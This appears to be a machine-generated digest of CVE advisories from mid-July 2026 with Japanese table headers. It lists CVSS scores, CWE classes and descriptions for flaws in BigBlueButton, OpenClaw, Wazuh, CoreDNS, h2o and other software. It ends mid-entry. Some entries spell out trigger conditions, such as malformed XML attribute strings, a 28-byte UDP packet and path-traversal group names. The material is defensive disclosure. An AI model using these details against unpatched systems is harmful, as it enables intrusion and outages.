### CVE-2026-46353

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-284` |
| Published | 2026-07-16T19:16:46.000 |

BigBlueButton is an open-source virtual classroom. Prior to 3.0.21, bbb-web checksum validation could be bypassed when a presentationUploadExternalUrl parameter was supplied to API request handling in CreateMeeting.java and ValidationService.java, allowing a user to send valid requests to some endpoints without a checksum. This issue is fixed in version 3.0.21.

### CVE-2026-46351

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-330` |
| Published | 2026-07-16T19:16:45.863 |

BigBlueButton is an open-source virtual classroom. Prior to 3.0.21, bbb-web generated conference sessionToken values with insufficiently secure randomness in bbb-common-web/src/main/java/org/bigbluebutton/api/Util.java and bigbluebutton-web/grails-app/controllers/org/bigbluebutton/web/controllers/ApiController.groovy, allowing a session user to predict other users' conference session tokens and impersonate them. This issue is fixed in version 3.0.21.

### CVE-2021-27137

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-121` |
| Published | 2026-07-16T18:16:39.113 |

An issue was discovered in router/upnp/src/ssdp.c in DD-WRT before 45724. An unsafe strcpy in the UPnP handling functionality allows an unauthenticated remote attacker to send a request that would overflow an internal fixed buffer. Exploitation requires the DD-WRT user to enable UPnP (which is off by default, and only listens on internal interfaces by default). This occurs in ssdp_msearch (reachable by an M-SEARCH request).

### CVE-2026-57076

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-416` |
| Published | 2026-07-16T22:17:43.550 |

YAML::Syck versions before 1.47 for Perl allow a heap use-after-free via an anchor name reused as an anchors-table key in syck_hdlr_add_anchor.

In the bundled libsyck an anchor name allocated by syck_strndup is stored both as node->anchor, freed when the node is freed, and as the key in the parser's anchors table. Freeing the node frees the shared key, and a later anchor redefinition makes st_delete compare against the freed key, so st_strcmp reads freed heap memory. Anchors are a standard YAML feature and need no special flags, so this is reached on the default Load path.

Any caller that runs Load or LoadFile on an untrusted document that redefines an anchor reaches the read of freed memory.

### CVE-2026-53411

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2026-07-16T22:17:31.267 |

A time-of-check to time-of-use (TOCTOU) race condition in the installation and uninstallation process of certain Zoom Clients for Windows could allow an authenticated local user to escalate privileges.

### CVE-2026-53409

| 項目 | 値 |
|------|-----|
| CVSS | `7.8` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2026-07-16T21:17:21.253 |

Improper Privilege Management in Zoom Rooms for Windows before version 7.1.0 may allow an authenticated user to conduct an escalation of privilege via local access.

### CVE-2026-62229

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-07-17T02:18:10.290 |

OpenClaw before 2026.5.18 contain an authorization bypass vulnerability in exec allowlist glob matching that allows lower-trust callers to execute actions beyond intended authorization. Attackers can craft input paths that traverse the allowlist glob patterns to execute or persist unauthorized actions when the affected feature is enabled.

### CVE-2026-62228

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-07-17T02:18:10.153 |

OpenClaw before 2026.6.5 contain an authorization bypass vulnerability in node exec approvals that allows lower-trust callers to execute actions beyond their intended authorization by using different gateway and node environments. Attackers can exploit mismatched environment configurations to persist or execute actions that exceed the caller's approved permissions.

### CVE-2026-62223

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-07-17T02:18:09.440 |

OpenClaw before 2026.5.18 contain an authorization bypass vulnerability in the device-pair approval feature that allows lower-trust callers to execute actions beyond their intended authorization. Attackers can exploit misconfigured input paths to execute or persist unauthorized actions when the affected feature is enabled and reachable.

### CVE-2026-62217

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-07-17T02:18:08.553 |

OpenClaw 2026.5.14-beta.1 before 2026.5.27 contain an authorization flaw in the QQBot exec approvals feature. When the feature is enabled and reachable, a lower-trust caller or configured input path could execute or persist actions beyond the caller's intended authorization, allowing non-allowlisted senders to perform unauthorized operations.

### CVE-2026-62207

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-07-17T02:18:07.040 |

OpenClaw versions before 2026.6.5 contain an authentication bypass vulnerability that allows lower-trust callers to reach admin-scoped tools. Attackers can perform actions requiring stronger authorization by exploiting insufficient policy checks on configured input paths.

### CVE-2026-62203

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-184` |
| Published | 2026-07-17T02:18:06.587 |

OpenClaw versions before 2026.6.6 contain an environment variable filtering vulnerability in host exec that fails to properly sanitize rustup startup variables. Attackers with lower-trust caller access or configured input paths can execute or persist actions beyond their intended authorization level.

### CVE-2026-62202

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-07-17T02:18:06.430 |

OpenClaw versions 2026.6.1 before 2026.6.9 contain a privilege escalation vulnerability in isolated cron jobs that allows lower-trust callers to regain denied execution tools. Attackers can execute or persist actions beyond their intended authorization by leveraging misconfigured input paths in the affected cron feature.

### CVE-2026-57077

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| Weaknesses | `CWE-125` |
| Published | 2026-07-16T22:17:43.650 |

YAML::Syck versions before 1.47 for Perl allow an out-of-bounds read via an unbounded newline scan in newline_len.

In the bundled libsyck newline_len and is_newline dereference the scan pointer, and the following byte for a "\r\n" pair, with no NUL-terminator or bounds check. During block-scalar lexing at a document boundary the scan runs one byte past the heap lexer buffer. This is an incomplete fix of CVE-2025-11683, on a lexer path the earlier fix did not cover.

Any caller that runs Load or LoadFile on an untrusted document with a block scalar at a document boundary reaches the over-read.

### CVE-2026-46687

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-24;CWE-98` |
| Published | 2026-07-16T18:16:44.203 |

Emlog is an open source website building system. In 2.6.13 and earlier, the article publishing interface stores a path-traversal template parameter from api_controller.php without validation, and log_controller.php later checks file_exists and calls include View::getView($template), allowing an authenticated author to include an arbitrary local .php file when an article is viewed. No fixed version is currently identified.

### CVE-2026-63088

| 項目 | 値 |
|------|-----|
| CVSS | `7.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-918` |
| Published | 2026-07-16T17:16:58.833 |

stoatchat before 0.14.0 contains a server-side request forgery (SSRF) vulnerability that allows unauthenticated network-accessible attackers to bypass the DNS-based IP blocklist by exploiting incomplete address validation in the url_is_blacklisted function, which inspects only the first resolved address while the underlying HTTP client iterates all cached addresses.

### CVE-2026-62209

| 項目 | 値 |
|------|-----|
| CVSS | `7.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-07-17T02:18:07.327 |

OpenClaw versions 2026.5.10-beta.1 before 2026.6.5 contain an authorization bypass in the ClickClack agent-mode dispatch feature, which could ignore the toolsAllow policy check. When the affected feature is enabled and reachable, a lower-trust caller or configured input path could perform actions that should have required a stronger authorization or policy check.

### CVE-2026-9592

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N/E:U/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-598` |
| Published | 2026-07-17T14:17:27.657 |

SEPPmail Secure Email Gateway & SEPPmail Cloud before version 15.0.4.2 allows an attacker to replay & hijack a user session in the GINA web portal, as the session token is disclosed inside the URL and a HTTP header.

### CVE-2026-7488

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-201` |
| Published | 2026-07-17T14:17:27.420 |

Insertion of sensitive information into sent data vulnerability in IKAS Technology Inc. E-Commerce allows Retrieve Embedded Sensitive Data.

This issue affects E-Commerce: through 03062026.

### CVE-2026-8396

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-611` |
| Published | 2026-07-17T13:19:01.827 |

Improper restriction of XML external entity reference vulnerability in Netcad Software Inc. NetGIS allows Serialized Data External Linking.

This issue affects NetGIS: from 5.0.66 before 7.2.2.

### CVE-2026-7189

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-201` |
| Published | 2026-07-17T13:19:01.490 |

Insertion of sensitive information into sent data vulnerability in Proliz Software Ltd. Co. Proliz's OBS allows Accessing Functionality Not Properly Constrained by ACLs.

This issue affects Proliz's OBS: before v3.6.0.

### CVE-2026-11575

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| Weaknesses | `CWE-862` |
| Published | 2026-07-17T07:16:37.753 |

The PhonePe Payment Solutions WordPress plugin before 3.1.0 does not properly verify the authenticity of incoming payment callbacks: the secret used to validate the callback signature is empty on sites configured through the current setup flow, so the expected signature reduces to an unkeyed hash of the request body that anyone can compute. This allows unauthenticated attackers to forge a payment-success notification and mark unpaid WooCommerce orders as paid without any payment being made.

### CVE-2026-13765

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-862` |
| Published | 2026-07-17T05:16:37.837 |

The LearnPress – WordPress LMS Plugin for Create and Sell Online Courses plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 4.4.1 via the check_answer. This makes it possible for unauthenticated attackers to extract the correct-answer markers, full option lists, explanations, and question content for any quiz question on the site — including questions belonging to paid courses the attacker is not enrolled in.

### CVE-2026-54340

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400;CWE-770` |
| Published | 2026-07-17T00:16:25.810 |

h2o is an HTTP server with support for HTTP/1.x, HTTP/2 and HTTP/3. Prior to commit 9265bdd, there is an HTTP/2 state amplification issue that combines HPACK decompression amplification with Slowloris-style stream stalling. Amplified decoded header state can be retained by stalled HTTP/2 streams, and depending on the configuration, additional limits are needed to bound decoded header state and prevent attack. This issue has been fixed by commit 9265bdd.

### CVE-2026-39359

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2026-07-17T00:16:25.663 |

Wazuh is a free and open source platform used for threat prevention, detection, and response. In versions 4.0.0 through 4.10.3 and 4.11.0 through 4.14.4, a logic flaw affects the Wazuh Manager's enrollment daemon (authd) and synchronization daemon (remoted). The authd process allows agents to select a group during enrollment but does not filter path traversal sequences such as "..." While the manager checks for the group directory using wopendir(), the ".." sequence references the parent directory (/var/ossec/etc), allowing it to pass validation. After the malicious group is accepted and stored in the manager's global database, the remoted process uses this unchecked value to build paths for agent configuration synchronization. As a result, sensitive files from /var/ossec/etc, such as client.keys, ossec.conf, and internal certificates, are included in the agent's shared configuration stream and exposed to the attacker. This issue has been fixed in versions 4.10.4 and 4.14.5.

### CVE-2026-34150

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-122` |
| Published | 2026-07-17T00:16:25.520 |

Wazuh is a free and open source platform used for threat prevention, detection, and response. In versions 1.0.0 and above, prior to 4.14.5, a heap buffer overflow in wazuh-analysisd allows an unauthenticated remote attacker to crash the Wazuh manager's analysis engine, causing complete loss of SIEM alert processing. The attack exploits the default configuration shipped in the official wazuh/wazuh-docker deployment with default configuration. An attacker can enroll with authd without a password to obtain a valid agent ID and encryption key, connect to remoted over the Wazuh agent protocol, and inject rootcheck events containing  {key: value}  patterns longer than 30 bytes that trigger a sprintf overflow of a 30-byte buffer in W_JSON_ParseRootcheck, corrupting the heap and crashing wazuh-analysisd so that all alert processing silently stops while the dashboard and API keep showing stale data.

### CVE-2026-44453

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-770;CWE-789` |
| Published | 2026-07-16T23:16:17.423 |

h2o is an HTTP server with support for HTTP/1.x, HTTP/2 and HTTP/3. Prior to commit 6b5370d, h2o is vulnerable to a Denial of Service attack when calling alloca under certain conditions. When serving static files, h2o builds the file path on stack, by calling alloca. The maximum size of the memory allocated using alloca can be as huge as ~600KB, which exceeds the default pthread stack size used by musl libc (128KB). If the amount of memory allocated by alloca exceeds the stack size, the h2o server crashes with a segmentation fault, while it tries to touch the guard page. This issue has been fixed by commit 6b5370d.

### CVE-2026-44436

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-120;CWE-787` |
| Published | 2026-07-16T23:16:17.143 |

Quicly is an IETF QUIC protocol implementation intended primarily for use within the H2O HTTP server. Prior to commit 8b178e6, Quicly is vulnerable to a Denial of Service attack through connection state corruption. In QUIC Invariants, the maximum length of a Connection ID is 255 bytes, while QUIC version 1 further restricts the maximum to 20 bytes. Quicly implements QUIC version 1 and therefore its CID buffers are limited to 20 bytes. However, to be able to respond to unknown versions of QUIC, its packet decoder accepts Connection IDs of up to 255 bytes. As its CID buffers are merely 20 bytes long, Quicly must reject QUIC version 1 packets with Connection IDs longer than that. The command line tool bundled with Quicly has had that check, however the library itself lacked such enforcement. As a consequence, when used by applications that lack their own enforcement, the connection state becoming inconsistent to buffer overrun. Fortunately, the overflow stops within the allocated chunk of memory, but nevertheless, the bug leads to assertion failures. This issue has been fixed by commit 8b178e6.

### CVE-2026-44435

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-400;CWE-617` |
| Published | 2026-07-16T23:16:17.010 |

Quicly is an IETF QUIC protocol implementation intended primarily for use within the H2O HTTP server. Prior to commit 937d0e9, an assertion failure is raised when the total number of valid handshake messages received over a CRYPTO stream of a single packet number space exceeds 32KB, causing a Denial of Service. This issue has been fixed by commit 937d0e9.

### CVE-2026-43977

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-639;CWE-863` |
| Published | 2026-07-16T23:16:16.167 |

wger is a free, open-source workout and fitness manager. In versions prior to 2.6, any authenticated user can read another user's private workout session notes, exercise history, and training statistics by calling the /logs/ and /stats/ actions on a routine they do not own. The vulnerability exists in RoutineViewSet (wger/manager/api/views.py). The view defines two custom actions /logs/ and /stats/ that are intended to return data for the requesting user's own training history within a routine. However, the underlying permission check (RoutinePermission.has_object_permission) grants read access to any authenticated user when the routine has is_template=True, regardless of ownership. When the /logs/ or /stats/ actions are invoked against a routine the attacker does not own, they return the owner's private workout history, not the attacker's. This issue has been fixed in version 2.6.

### CVE-2026-59117

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-190` |
| Published | 2026-07-16T22:17:52.597 |

Integer overflow or wraparound in Windows Terminal allows an unauthorized attacker to execute code over a network.

### CVE-2026-33692

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-20` |
| Published | 2026-07-16T21:17:20.183 |

WWBN AVideo is an open source video platform. Versions prior to 29.0 expose .env files to unauthenticated users through the official Docker compose configuration. The official docker-compose.yml mounts the entire project root directory as the Apache document root, causing  the .env file — which contains database credentials, admin passwords, and infrastructure configuration — to be served as a static file at /.env. No .htaccess rule or Apache configuration blocks access to dotfiles. Exploitation enables direct database access, admin panel takeover, and further lateral movement within the Docker network. This issue has been resolved in version 29.0.

### CVE-2026-62309

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-476` |
| Published | 2026-07-16T20:16:47.030 |

CoreDNS is a DNS server written in Go. Prior to 1.14.4, a single 28-byte UDP datagram can crash the CoreDNS process when the proxyproto plugin is enabled because plugin/pkg/proxyproto/proxyproto.go PacketConn.ReadFrom handles a PROXY v2 header with non-UDP transport such as family byte 0x11, reassigns addr from a nil readFrom result after parseProxyProtocol errors, and calls addr.String() in the warning log before ServeDNS recovery applies. This issue is fixed in version 1.14.4.

### CVE-2026-45367

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-1333` |
| Published | 2026-07-16T17:16:56.293 |

HAPI FHIR is a complete implementation of the HL7 FHIR standard for healthcare interoperability in Java. Prior to 6.9.7, the FHIRPathEngine implementation passes user-controlled regular expressions from matches(), matchesFull(), and replaceMatches() to Java regex operations without effective timeouts, allowing catastrophic backtracking and denial of service. This issue is fixed in version 6.9.7.

### CVE-2026-13401

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-835` |
| Published | 2026-07-16T17:16:55.320 |

XML::Bare versions through 0.53 for Perl will hang in an infinite loop when parsing malformed attributes.

The parserc_parse function never advances the attribute-parse state cursor on certain malformed attribute forms, looping forever.

Nameless attributes such as "<a ='c'>" or unbalanced quotes "<a b='''''''c'>" can trigger this condition.

### CVE-2026-13397

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-835` |
| Published | 2026-07-16T17:16:55.213 |

HTML::Bare versions through 0.04 for Perl will hang in an infinite loop when parsing malformed attributes.

The parserc_parse function never advances the attribute-parse state cursor on certain malformed attribute forms, looping forever.

Nameless attributes such as "<a ='c'>" or unbalanced quotes "<a b='''''''c'>" can trigger this condition.

Note that the latest version available on CPAN is version 0.02. Newer versions are available on the git repository.

### CVE-2026-53598

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| Weaknesses | `CWE-22;CWE-200` |
| Published | 2026-07-16T16:19:12.990 |

Prompty is a markdown file format (.prompty) for LLM prompts. Prior to 2.0.0-beta.2, Prompty loaders expanded ${file:...} references in .prompty frontmatter without enforcing that resolved paths stayed within the prompt directory or allowed roots, allowing an attacker-controlled prompt file to read local files through absolute paths, .. traversal, or symlink escapes. This issue is fixed in versions 2.0.0-beta.2.

### CVE-2026-59862

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-07-16T15:16:35.570 |

Kiota is an OpenAPI based HTTP Client code generator. Prior to 1.32.0, Kiota's Python generator let attacker-controlled enum value descriptions from x-ms-enum.values[].description flow through KiotaBuilder.SetEnumOptions into Documentation.DescriptionTemplate and PythonConventionService.RemoveInvalidDescriptionCharacters without newline sanitization, allowing generated inline comments to split and execute attacker-controlled Python code at module scope when generated modules were imported. This issue is fixed in version 1.32.0.

### CVE-2026-59861

| 項目 | 値 |
|------|-----|
| CVSS | `7.5` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-07-16T15:16:35.440 |

Kiota is an OpenAPI based HTTP Client code generator. Prior to 1.32.0, Kiota's Ruby generator embedded OpenAPI default fields, property names, and other schema-derived strings through CodeMethodWriter.cs and SanitizeForQuotedLiteral() in Writers/StringExtensions.cs into Ruby double-quoted literals without escaping #, allowing attacker-controlled #{expr}, #$var, or #@var interpolation markers to inject arbitrary Ruby code into generated model classes. This issue is fixed in version 1.32.0.

### CVE-2026-46513

| 項目 | 値 |
|------|-----|
| CVSS | `7.4` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-256` |
| Published | 2026-07-16T19:16:46.640 |

Frogman provides headless PBX control through MCP and HTTP API. Prior to 1.6.2, Frogman stored API tokens generated by Tools/CreateApiToken.php:33-36 as raw bin2hex(random_bytes(32)) strings in oc_api_tokens, and Frogman.class.php:78 authenticated the X-Frogman-Token header by comparing it with the stored raw value, allowing database read access to recover reusable active tokens at their assigned permission level, including admin. This issue is fixed in version 1.6.2.

### CVE-2019-25764

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-782` |
| Published | 2026-07-17T07:16:37.193 |

**UNSUPPORTED WHEN ASSIGNED**  Exposed IOCTL with Insufficient Access Control in the ASUS AURA SYNC driver allows a local user to bypass the driver's verification and invoke arbitrary IOCTLs, resulting in privilege escalation.

Refer to the 'End-of-Life Notice and Driver Update for Legacy ASUS Drivers ' section on the ASUS Security Advisory for more information.

### CVE-2024-32386

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-22` |
| Published | 2026-07-16T21:17:18.547 |

Directory traversal vulnerability in Kerlink Kerlink Wirnet iStation 868 KerOS v.4.3.3_20200803132042 allows a remote attacker to obtain sensitive information via the SNMP update mechanism.

### CVE-2026-62290

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` |
| Weaknesses | `CWE-863` |
| Published | 2026-07-16T20:16:46.550 |

cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters, and simplifies the process of obtaining, renewing and using those certificates. From 1.18.0 until 1.19.6 and 1.20.3, Challenge resources under acme.cert-manager.io can be created directly by namespace users without admission validation tying the Challenge to an Order, owner reference, or Issuer-selected solver, allowing attacker-controlled Challenge.spec.solver values referencing a ClusterIssuer to bypass DNS01 solver selectors such as dnsZones, dnsNames, and matchLabels and cause cert-manager to use ClusterIssuer DNS credentials for attacker-selected provider settings and DNS names, including disclosure of X-Api-User and X-Api-Key headers for acme-dns. This issue is fixed in versions 1.19.6 and 1.20.3.

### CVE-2026-61389

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-787` |
| Published | 2026-07-16T20:16:46.270 |

An out-of-bounds write vulnerability in the Productivity Suite allows a 
local attacker to trigger kernel memory corruption via a crafted IOCTL 
request, potentially resulting in privilege escalation or system 
instability.

### CVE-2026-60063

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
| Vector | `CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-787` |
| Published | 2026-07-16T20:16:45.953 |

An out-of-bounds write vulnerability in the Productivity Suite allows a 
local attacker to trigger kernel memory corruption via a crafted IOCTL 
request, potentially resulting in privilege escalation or system 
instability.

### CVE-2026-9046

| 項目 | 値 |
|------|-----|
| CVSS | `7.3` |
